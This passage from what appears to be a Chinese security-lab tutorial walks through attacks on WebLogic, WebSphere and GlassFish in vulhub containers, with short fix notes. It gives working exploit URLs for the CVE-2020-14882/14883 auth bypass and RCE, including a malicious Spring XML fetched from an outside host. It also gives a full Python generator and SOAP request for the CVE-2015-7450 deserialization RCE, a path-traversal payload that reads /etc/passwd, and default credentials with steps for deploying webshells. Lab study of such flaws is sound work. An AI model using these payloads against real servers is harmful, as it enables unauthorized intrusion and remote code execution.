（2）用burpsuite抓包，点击Search，抓包之后在Burp中右键，选择Change request method, 将POST请求改变成GET

![image-20220124000226377](image/image-20220124000226377.png)

（2）参数operator为SSRF的可控参数，将其更改为开放的端口，如http://192.168.96.2:7001，将返回error code

![image-20220124000520537](image/image-20220124000520537.png)

（3）ssrf请求返回结果有以下几种：

第一种：不存在的端口或IP地址
返回could not connect over HTTP to server

![image-20220124000718034](image/image-20220124000718034.png)

第二种：主机存活且端口存在
若开放端口为HTTP协议，则会返回did not have a valid SOAP content-type: text/html

![image-20220124000953653](image/image-20220124000953653.png)

第三种：可访问的端口（且该端口是非http协议）

若开放端口非HTTP协议，则会返回did not have a valid SOAP content-type: null

![image-20220124001031800](image/image-20220124001031800.png)



------

### Weblogic 弱口令 && 后台getshell

#### 漏洞简介

```php
  Weblogic存在弱口令，导致后台上传Getshell
```

#### 影响版本

```php
Weblogic全版本
```

#### 环境搭建

本次实验使用vulhub镜像来搭建

```php
cd vulhub/weblogic/weak_password
sudo docker-compose up -d
```

#### 漏洞复现

（1）环境启动后，访问`http://your-ip:7001/console`，即为weblogic后台。

![image-20220124001810254](image/image-20220124001810254.png)

（2）使用weblogic/Oracle@123用户名密码登录进后台，点击左侧的部署，在点击安装

![image-20220124002029492](image/image-20220124002029492.png)



（3）点击上载文件，然后上传一个shell.war包，再选择下一步

![image-20220124002246522](image/image-20220124002246522.png)

![image-20220124002318098](image/image-20220124002318098.png)

（4）上传完成以后选中你上传的文件,点击下一步，然后继续默认下一步

![image-20220124002451955](image/image-20220124002451955.png)

然后继续默认下一步，到最后点击完成即可

![image-20220124002640035](image/image-20220124002640035.png)

（5）选用我们安装的应用，点击启动即可：

![image-20220124002732209](image/image-20220124002732209.png)

（6）最后用蚁剑连接Webshell

```php
http://192.168.127.1:7001/shell/shell.jsp
```

![image-20220124002840088](image/image-20220124002840088.png)



------

### Weblogic Console HTTP协议远程代码执行漏洞（CVE-2020-14882/3）

#### 漏洞简介

```php
  在Oracle 重要补丁更新公告- 2020 年 10 月中，Oracle 修复了 CVE-2020-14882 和 CVE-2020-14883 来自 Chaitin Tech 的安全研究员 @Voidfyoo 提交的两个安全漏洞。
  CVE-2020-14882 允许远程用户绕过管理员控制台组件中的身份验证，CVE-2020-14883 允许经过身份验证的用户在管理员控制台组件上执行任何命令。使用这两个漏洞链，未经身份验证的远程攻击者可以通过 HTTP 在 Oracle WebLogic 服务器上执行任意命令并完全控制主机。
```

#### 影响版本

```php
10.3.6.0，12.1.3.0，12.2.1.3，12.2.1.4，14.1.1.0
```

#### 环境搭建

本次实验使用vulhub镜像来搭建

```php
cd vulhub/weblogic/CVE-2020-14882
sudo docker-compose up -d
```

#### 漏洞复现

CVE-2020-14882漏洞

（1）启动完成后，访问`http://your-ip:7001/console`查看管理员控制台登录页面。

![image-20220124005022255](image/image-20220124005022255-16429566231682.png)

（2）使用以下URL 绕过 Console 组件的身份验证：

```
http://your-ip:7001/console/css/%252e%252e%252fconsole.portal
```

![image-20220124005141327](image/image-20220124005141327.png)

（3）不过没有上传 webshell 的权限：

![image-20220124005218280](image/image-20220124005218280.png)

CVE-2020-14883漏洞

```php
有两种利用方式，一种是通过com.tangosol.coherence.mvel2.sh.ShellSession，另一种是通过com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext。
```

（1）访问以下 URL 以链接 2 个漏洞并执行以下命令`com.tangosol.coherence.mvel2.sh.ShellSession`：

```
http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');")
```

![image-20220124005407765](image/image-20220124005407765.png)

`touch /tmp/success1` 已在容器内成功执行：

![image-20220124005356541](image/image-20220124005356541.png)

这种利用方法只能在 Weblogic 12.2.1 及以上版本中使用，因为 10.3.6 没有 class `com.tangosol.coherence.mvel2.sh.ShellSession`。

`com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext` 是一种更常见的漏洞利用，首次在 CVE-2019-2725 中引入，可用于任何 Weblogic 版本。

（2）要利用`FileSystemXmlApplicationContext`，您需要制作一个精心制作的 XML 文件并将其提供到 Weblogic 可以访问的服务器上，例如`http://example.com/rce.xml`：

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
          <list>
            <value>bash</value>
            <value>-c</value>
            <value><![CDATA[touch /tmp/success2]]></value>
          </list>
        </constructor-arg>
    </bean>
</beans>
```

将rce.xml放到本地主机上，用Python3开启一个简易版的HTTP服务器，然后通过以下 URL，Weblogic 将加载此 XML 并执行其中的命令：

```
http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://example.com/rce.xml")
```

![image-20220124005705600](image/image-20220124005705600.png)

`touch /tmp/success2` 已在容器内成功执行：

![image-20220124005817562](image/image-20220124005817562.png)

该漏洞利用的缺点是，它要求 Weblogic 服务器能够访问恶意 XML。





## WebSphere漏洞复现

### Java反序列化(CVE-2015-7450）

#### 漏洞简述

```php
 Apache Commons Collections (ACC) 3.2.1及4.0版本未能正确验证用户输入，其InvokerTransformer类在反序列化来自可疑域的数据时存在安全漏洞，这可使攻击者在用户输入中附加恶意代码并组合运用不同类的readObject()方法，在最终类型检查之前执行Java函数或字节码（包括调用Runtime.exec()执行本地OS命令）。
```

#### 影响版本

```php
IBM Websphere Application Server 7.0
IBM Websphere Application Server 6.2
```

#### 环境搭建

```php
docker pull iscrosales/websphere7
docker run -d -p 9060:9060 -p 9043:9043 -p 8880:8880 -p 9080:9080 iscrosales/websphere7
```

#### 漏洞复现

（1）该反序列化漏洞发生位置在SOAP的通信端口8880，使用https发送XML格式数据。如果访问8880端口出现如下界面，则可能存在Java反序列化漏洞：

![image-20220123153751077](image/image-20220123153751077.png)

（2）访问8880，并抓包，然后替换如下Payload进行复现，注意更改下Host.然后将构造的执行命令的payload通过base64编码后放在objectname节点中，通过https发送到服务器端，服务器端调用相应的执行函数，将结果发送给客户端，同样返回的数据也是经过base64编码的。

```php
import base64
from binascii import unhexlify

command = "touch /tmp/123"  //要执行的命令
serObj = unhexlify("ACED00057372003273756E2E7265666C6563742E616E6E6F746174696F6E2E416E6E6F746174696F6E496E766F636174696F6E48616E646C657255CAF50F15CB7EA50200024C000C6D656D62657256616C75657374000F4C6A6176612F7574696C2F4D61703B4C0004747970657400114C6A6176612F6C616E672F436C6173733B7870737D00000001000D6A6176612E7574696C2E4D6170787200176A6176612E6C616E672E7265666C6563742E50726F7879E127DA20CC1043CB0200014C0001687400254C6A6176612F6C616E672F7265666C6563742F496E766F636174696F6E48616E646C65723B78707371007E00007372002A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E6D61702E4C617A794D61706EE594829E7910940300014C0007666163746F727974002C4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436861696E65645472616E73666F726D657230C797EC287A97040200015B000D695472616E73666F726D65727374002D5B4C6F72672F6170616368652F636F6D6D6F6E732F636F6C6C656374696F6E732F5472616E73666F726D65723B78707572002D5B4C6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E5472616E73666F726D65723BBD562AF1D83418990200007870000000057372003B6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E436F6E7374616E745472616E73666F726D6572587690114102B1940200014C000969436F6E7374616E747400124C6A6176612F6C616E672F4F626A6563743B7870767200116A6176612E6C616E672E52756E74696D65000000000000000000000078707372003A6F72672E6170616368652E636F6D6D6F6E732E636F6C6C656374696F6E732E66756E63746F72732E496E766F6B65725472616E73666F726D657287E8FF6B7B7CCE380200035B000569417267737400135B4C6A6176612F6C616E672F4F626A6563743B4C000B694D6574686F644E616D657400124C6A6176612F6C616E672F537472696E673B5B000B69506172616D54797065737400125B4C6A6176612F6C616E672F436C6173733B7870757200135B4C6A6176612E6C616E672E4F626A6563743B90CE589F1073296C02000078700000000274000A67657452756E74696D65757200125B4C6A6176612E6C616E672E436C6173733BAB16D7AECBCD5A990200007870000000007400096765744D6574686F647571007E001E00000002767200106A6176612E6C616E672E537472696E67A0F0A4387A3BB34202000078707671007E001E7371007E00167571007E001B00000002707571007E001B00000000740006696E766F6B657571007E001E00000002767200106A6176612E6C616E672E4F626A656374000000000000000000000078707671007E001B7371007E0016757200135B4C6A6176612E6C616E672E537472696E673BADD256E7E91D7B470200007870000000017400")
serObj += (chr(len(command)) + command).encode('ascii')
serObj += unhexlify("740004657865637571007E001E0000000171007E00237371007E0011737200116A6176612E6C616E672E496E746567657212E2A0A4F781873802000149000576616C7565787200106A6176612E6C616E672E4E756D62657286AC951D0B94E08B020000787000000001737200116A6176612E7574696C2E486173684D61700507DAC1C31660D103000246000A6C6F6164466163746F724900097468726573686F6C6478703F40000000000010770800000010000000007878767200126A6176612E6C616E672E4F766572726964650000000000000000000000787071007E003A")
serObjB64 = base64.b64encode(serObj).decode()
print(serObjB64)
```

然后将输出的serObjB64，替换到如下数据包中的{serObjB64}处,发送数据包即可执行。

```php
POST / HTTP/1.1
Host: 192.168.22.1:8880
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: beegosessionID=d00ca879f5ab852ac89f5306d6792ea4; lang=en-US
Connection: close
Content-Type: text/xml
SOAPAction: urn:AdminService
Content-Length: 8842
 
<?xml version='1.0' encoding='UTF-8'?>
<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">
<SOAP-ENV:Header ns0:JMXConnectorContext="rO0ABXNyAA9qYXZhLnV0aWwuU3RhY2sQ/irCuwmGHQIAAHhyABBqYXZhLnV0aWwuVmVjdG9y2Zd9W4A7rwEDAANJABFjYXBhY2l0eUluY3JlbWVudEkADGVsZW1lbnRDb3VudFsAC2VsZW1lbnREYXRhdAATW0xqYXZhL2xhbmcvT2JqZWN0O3hwAAAAAAAAAAF1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAAKc3IAOmNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3IuSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnTblRMyYyF8sQIABUwACGNlbGxOYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAIaG9zdE5hbWVxAH4AB0wACG5vZGVOYW1lcQB+AAdMAApzZXJ2ZXJOYW1lcQB+AAdbAApzdGFja1RyYWNldAAeW0xqYXZhL2xhbmcvU3RhY2tUcmFjZUVsZW1lbnQ7eHB0AAB0AAhMYXAzOTAxM3EAfgAKcQB+AAp1cgAeW0xqYXZhLmxhbmcuU3RhY2tUcmFjZUVsZW1lbnQ7AkYqPDz9IjkCAAB4cAAAACpzcgAbamF2YS5sYW5nLlN0YWNrVHJhY2VFbGVtZW50YQnFmiY23YUCAARJAApsaW5lTnVtYmVyTAAOZGVjbGFyaW5nQ2xhc3NxAH4AB0wACGZpbGVOYW1lcQB+AAdMAAptZXRob2ROYW1lcQB+AAd4cAAAAEt0ADpjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHRFbGVtZW50dAAfSk1YQ29ubmVjdG9yQ29udGV4dEVsZW1lbnQuamF2YXQABjxpbml0PnNxAH4ADgAAADx0ADNjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLkpNWENvbm5lY3RvckNvbnRleHR0ABhKTVhDb25uZWN0b3JDb250ZXh0LmphdmF0AARwdXNoc3EAfgAOAAAGQ3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAcZ2V0Sk1YQ29ubmVjdG9yQ29udGV4dEhlYWRlcnNxAH4ADgAAA0h0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQAEmludm9rZVRlbXBsYXRlT25jZXNxAH4ADgAAArF0ADhjb20uaWJtLndzLm1hbmFnZW1lbnQuY29ubmVjdG9yLnNvYXAuU09BUENvbm5lY3RvckNsaWVudHQAGFNPQVBDb25uZWN0b3JDbGllbnQuamF2YXQADmludm9rZVRlbXBsYXRlc3EAfgAOAAACp3QAOGNvbS5pYm0ud3MubWFuYWdlbWVudC5jb25uZWN0b3Iuc29hcC5TT0FQQ29ubmVjdG9yQ2xpZW50dAAYU09BUENvbm5lY3RvckNsaWVudC5qYXZhdAAOaW52b2tlVGVtcGxhdGVzcQB+AA4AAAKZdAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA4AAAHndAA4Y29tLmlibS53cy5tYW5hZ2VtZW50LmNvbm5lY3Rvci5zb2FwLlNPQVBDb25uZWN0b3JDbGllbnR0ABhTT0FQQ29ubmVjdG9yQ2xpZW50LmphdmF0AAZpbnZva2VzcQB+AA7/dAAVY29tLnN1bi5wcm94eS4kUHJveHkwcHQABmludm9rZXNxAH4ADgAAAOB0ACVjb20uaWJtLndzLm1hbmFnZW1lbnQuQWRtaW5DbGllbnRJbXBsdAAUQWRtaW5DbGllbnRJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAADYdAA9Y29tLmlibS53ZWJzcGhlcmUubWFuYWdlbWVudC5jb25maWdzZXJ2aWNlLkNvbmZpZ1NlcnZpY2VQcm94eXQAF0NvbmZpZ1NlcnZpY2VQcm94eS5qYXZhdAARZ2V0VW5zYXZlZENoYW5nZXNzcQB+AA4AAAwYdAAmY29tLmlibS53cy5zY3JpcHRpbmcuQWRtaW5Db25maWdDbGllbnR0ABZBZG1pbkNvbmZpZ0NsaWVudC5qYXZhdAAKaGFzQ2hhbmdlc3NxAH4ADgAAA/Z0AB5jb20uaWJtLndzLnNjcmlwdGluZy5XYXN4U2hlbGx0AA5XYXN4U2hlbGwuamF2YXQACHRpbWVUb0dvc3EAfgAOAAAFm3QAImNvbS5pYm0ud3Muc2NyaXB0aW5nLkFic3RyYWN0U2hlbGx0ABJBYnN0cmFjdFNoZWxsLmphdmF0AAtpbnRlcmFjdGl2ZXNxAH4ADgAACPp0ACJjb20uaWJtLndzLnNjcmlwdGluZy5BYnN0cmFjdFNoZWxsdAASQWJzdHJhY3RTaGVsbC5qYXZhdAADcnVuc3EAfgAOAAAElHQAHmNvbS5pYm0ud3Muc2NyaXB0aW5nLldhc3hTaGVsbHQADldhc3hTaGVsbC5qYXZhdAAEbWFpbnNxAH4ADv50ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQAB2ludm9rZTBzcQB+AA4AAAA8dAAkc3VuLnJlZmxlY3QuTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsdAAdTmF0aXZlTWV0aG9kQWNjZXNzb3JJbXBsLmphdmF0AAZpbnZva2VzcQB+AA4AAAAldAAoc3VuLnJlZmxlY3QuRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbHQAIURlbGVnYXRpbmdNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAAmN0ABhqYXZhLmxhbmcucmVmbGVjdC5NZXRob2R0AAtNZXRob2QuamF2YXQABmludm9rZXNxAH4ADgAAAOp0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAKbGF1bmNoTWFpbnNxAH4ADgAAAGB0ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAAEbWFpbnNxAH4ADgAAAE10ACJjb20uaWJtLndzc3BpLmJvb3RzdHJhcC5XU0xhdW5jaGVydAAPV1NMYXVuY2hlci5qYXZhdAADcnVuc3EAfgAO/nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAHaW52b2tlMHNxAH4ADgAAADx0ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAACV0AChzdW4ucmVmbGVjdC5EZWxlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsdAAhRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAGaW52b2tlc3EAfgAOAAACY3QAGGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZHQAC01ldGhvZC5qYXZhdAAGaW52b2tlc3EAfgAOAAACS3QANG9yZy5lY2xpcHNlLmVxdWlub3guaW50ZXJuYWwuYXBwLkVjbGlwc2VBcHBDb250YWluZXJ0ABhFY2xpcHNlQXBwQ29udGFpbmVyLmphdmF0ABdjYWxsTWV0aG9kV2l0aEV4Y2VwdGlvbnNxAH4ADgAAAMZ0ADFvcmcuZWNsaXBzZS5lcXVpbm94LmludGVybmFsLmFwcC5FY2xpcHNlQXBwSGFuZGxldAAVRWNsaXBzZUFwcEhhbmRsZS5qYXZhdAADcnVuc3EAfgAOAAAAbnQAPG9yZy5lY2xpcHNlLmNvcmUucnVudGltZS5pbnRlcm5hbC5hZGFwdG9yLkVjbGlwc2VBcHBMYXVuY2hlcnQAF0VjbGlwc2VBcHBMYXVuY2hlci5qYXZhdAAOcnVuQXBwbGljYXRpb25zcQB+AA4AAABPdAA8b3JnLmVjbGlwc2UuY29yZS5ydW50aW1lLmludGVybmFsLmFkYXB0b3IuRWNsaXBzZUFwcExhdW5jaGVydAAXRWNsaXBzZUFwcExhdW5jaGVyLmphdmF0AAVzdGFydHNxAH4ADgAAAXF0AC9vcmcuZWNsaXBzZS5jb3JlLnJ1bnRpbWUuYWRhcHRvci5FY2xpcHNlU3RhcnRlcnQAE0VjbGlwc2VTdGFydGVyLmphdmF0AANydW5zcQB+AA4AAACzdAAvb3JnLmVjbGlwc2UuY29yZS5ydW50aW1lLmFkYXB0b3IuRWNsaXBzZVN0YXJ0ZXJ0ABNFY2xpcHNlU3RhcnRlci5qYXZhdAADcnVuc3EAfgAO/nQAJHN1bi5yZWZsZWN0Lk5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbHQAHU5hdGl2ZU1ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAHaW52b2tlMHNxAH4ADgAAADx0ACRzdW4ucmVmbGVjdC5OYXRpdmVNZXRob2RBY2Nlc3NvckltcGx0AB1OYXRpdmVNZXRob2RBY2Nlc3NvckltcGwuamF2YXQABmludm9rZXNxAH4ADgAAACV0AChzdW4ucmVmbGVjdC5EZWxlZ2F0aW5nTWV0aG9kQWNjZXNzb3JJbXBsdAAhRGVsZWdhdGluZ01ldGhvZEFjY2Vzc29ySW1wbC5qYXZhdAAGaW52b2tlc3EAfgAOAAACY3QAGGphdmEubGFuZy5yZWZsZWN0Lk1ldGhvZHQAC01ldGhvZC5qYXZhdAAGaW52b2tlc3EAfgAOAAABVHQAHm9yZy5lY2xpcHNlLmNvcmUubGF1bmNoZXIuTWFpbnQACU1haW4uamF2YXQAD2ludm9rZUZyYW1ld29ya3NxAH4ADgAAARp0AB5vcmcuZWNsaXBzZS5jb3JlLmxhdW5jaGVyLk1haW50AAlNYWluLmphdmF0AAhiYXNpY1J1bnNxAH4ADgAAA9V0AB5vcmcuZWNsaXBzZS5jb3JlLmxhdW5jaGVyLk1haW50AAlNYWluLmphdmF0AANydW5zcQB+AA4AAAGQdAAlY29tLmlibS53c3NwaS5ib290c3RyYXAuV1NQcmVMYXVuY2hlcnQAEldTUHJlTGF1bmNoZXIuamF2YXQADWxhdW5jaEVjbGlwc2VzcQB+AA4AAACjdAAlY29tLmlibS53c3NwaS5ib290c3RyYXAuV1NQcmVMYXVuY2hlcnQAEldTUHJlTGF1bmNoZXIuamF2YXQABG1haW5wcHBwcHBwcHB4" xmlns:ns0="admin" ns0:WASRemoteRuntimeVersion="8.5.5.7" ns0:JMXMessageVersion="1.2.0" ns0:JMXVersion="1.2.0">
</SOAP-ENV:Header>
<SOAP-ENV:Body>
<ns1:invoke xmlns:ns1="urn:AdminService" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<objectname xsi:type="ns1:javax.management.ObjectName">rO0ABXNyABtqYXZheC5tYW5hZ2VtZW50Lk9iamVjdE5hbWUPA6cb620VzwMAAHhwdACxV2ViU3BoZXJlOm5hbWU9Q29uZmlnU2VydmljZSxwcm9jZXNzPXNlcnZlcjEscGxhdGZvcm09cHJveHksbm9kZT1MYXAzOTAxM05vZGUwMSx2ZXJzaW9uPTguNS41LjcsdHlwZT1Db25maWdTZXJ2aWNlLG1iZWFuSWRlbnRpZmllcj1Db25maWdTZXJ2aWNlLGNlbGw9TGFwMzkwMTNOb2RlMDFDZWxsLHNwZWM9MS4weA==</objectname>
<operationname xsi:type="xsd:string">getUnsavedChanges</operationname>
<params xsi:type="ns1:[Ljava.lang.Object;">{serObjB64}</params>
<signature xsi:type="ns1:[Ljava.lang.String;">rO0ABXVyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0ACRjb20uaWJtLndlYnNwaGVyZS5tYW5hZ2VtZW50LlNlc3Npb24=</signature>
</ns1:invoke>
</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```

进入docker中检测文件是否新建成功

![image-20220123155845677](image/image-20220123155845677.png)

通过工具去漏洞利用执行命令

![image-20220123154628758](image/image-20220123154628758.png)



#### 漏洞修复

* 7.x版本已不提供支持，因此升级版本。
* 若版本还在IBM支持范围，可选择打补丁。



------

### 弱口令 && 后台Getshell

#### 漏洞简述

```php
在6.x至7.0版本，后台登陆只需要输入admin作为用户标识，无需密码，即可登陆后台。
websphere/ websphere
system/ manager
```

#### 影响版本

```php
全版本后台登录账号弱口令
```

#### 环境搭建

```php
docker pull iscrosales/websphere7
docker run -d -p 9060:9060 -p 9043:9043 -p 8880:8880 -p 9080:9080 iscrosales/websphere7
```

#### 漏洞复现

（1）访问`http:/your-ip:9060/ibm/console/login.do`，点击WebSphere 企业应用程序，点击安装。

![image-20220123160412800](image/image-20220123160412800.png)

（2）将jsp Webshell压缩为zip，再将zip后缀改名为war

![image-20220107104638478](image/image-20220107104638478.png)

（3）上传war包，点击下一步。

![image-20220123160516498](image/image-20220123160516498.png)

（4）一直点击下一步，直到下图，填写上下文根，关系到你访问的URL，接着一直点下一步直到安装完成。

![image-20220123161121545](image/image-20220123161121545.png)

（5）安装完成之后，点击保存主配置，然后回到WebSphere 企业应用程序，选中war包启动，访问shell。

![image-20220123160747910](image/image-20220123160747910.png)

![image-20220123160814644](image/image-20220123160814644.png)



（6）蚁剑连接Webshell



```php
http://192.168.22.1:9080/shell/shell.jsp
```

![image-20220123161938032](image/image-20220123161938032.png)





#### 漏洞修复

* 密码强度需设置 包含 大写字母，小写字母，数字，特殊字符，且长度大于10位。







## Glassfish漏洞复现

```php
GlassFish 是用于构建 Java EE 5应用服务器的开源开发项目的名称。它基于 Sun Microsystems 提供的 Sun Java System Application Server PE 9 的源代码以及 Oracle 贡献的 TopLink 持久性代码。该项目提供了开发高质量应用服务器的结构化过程，以前所未有的速度提供新的功能。
默认端口：8080（Web应用端口，即网站内容），4848（GlassFish管理中心）
指纹信息：
Server: GlassFish Server Open Source Edition 4.1.2
X-Powered-By: Servlet/3.1 JSP/2.3 (GlassFish Server Open Source Edition 4.1.2 Java/Oracle Corporation/1.8)
```

### GlassFish 任意文件读取（CVE-2017-1000028）

#### 漏洞简述

java语言中会把%c0%af解析为\uC0AF，最后转义为ASCCII字符的/（斜杠）。利用..%c0%af..%c0%af来向上跳转，达到目录穿越、任意文件读取的效果。 计算机指定了UTF8编码接收二进制并进行转义，当发现字节以0开头，表示这是一个标准ASCII字符，直接转义，当发现110开头，则取2个字节 去掉110模板后转义。

java语言中会把%c0%ae解析为\uC0AE，最后转义为ASCCII字符的.（点）。利用%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/来向上跳转，达到目录穿越、任意文件读取的效果。

![image-20220123111503802](image/image-20220123111503802.png)

C0AF 转换位二进制为 110 00000 10 101111 ，110开头去掉摸板后为00000 101111 转换为10进制为47，ASSCI为/;C0AE同理。

#### 影响版本

```php
GlassFish <=4.1.2版本
```

#### 环境搭建

使用vulhub

cd /vulhub/glassfish/4.1.0

```php
sudo docker-compose up -d
```

#### 漏洞复现

（1）访问`http://your-ip:8080`和`http://your-ip:4848`即可查看web页面。其中，8080端口是网站内容，4848端口是GlassFish管理中心。

![image-20220123111941229](image/image-20220123111941229.png)

（2）使用Payload读取/etc/passwd文件

```php
https://192.168.22.1:4848/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
```

![image-20220123112202420](image/image-20220123112202420.png)

#### 漏洞修复

升级至最新版本或者4.1.2版本以上。



------

### GlassFish 后台Getshell

#### 漏洞简述

```php
  通过爆破或者弱口令进入后台后，可以部署war包来getshell。
```

#### 影响版本

```php
GlassFish全版本
```

#### 环境搭建

使用vulhub

```php
cd /vulhub/glassfish/4.1.0
vim docker-compose.yml
修改docker-compose.yml文件为如下内容：
    version: '2'
	services:
 	glassfish:
   image: vulhub/glassfish:4.1
   ports:
    - "4848:4848"
    - "8080:8080"
   environment:
    - ADMIN_PASSWORD=123

开启容器
sudo docker-compose up -d
```

#### 漏洞复现

（1）访问`http://your-ip:8080`和`http://your-ip:4848`即可查看web页面。其中，8080端口是网站内容，4848端口是GlassFish管理中心。

![image-20220123111941229](image/image-20220123111941229.png)

（2）使用admin/123用户名密码登录到后台管理中

![image-20220123112706856](image/image-20220123112706856.png)

（3）进入后台后点击Applications，点击右边的deploy。

![image-20220123112818784](image/image-20220123112818784.png)

（4）将jsp Webshell压缩为zip，再将zip后缀改名为war

![image-20220107104638478](image/image-20220107104638478.png)

（5）选中war包后上传，其他参数默认即可，点击Ok。

![image-20220123113219468](image/image-20220123113219468.png)

（6）上传成功后，用蚁剑连接Webshell

```
http://127.0.0.1:8080/shell/shell.jsp
```

![image-20220123113852340](image/image-20220123113852340.png)



#### 漏洞修复

1、修改强密码， 包含 大写字母，小写字母，数字，特殊字符，且长度大于10位。

2、后台不对外网开放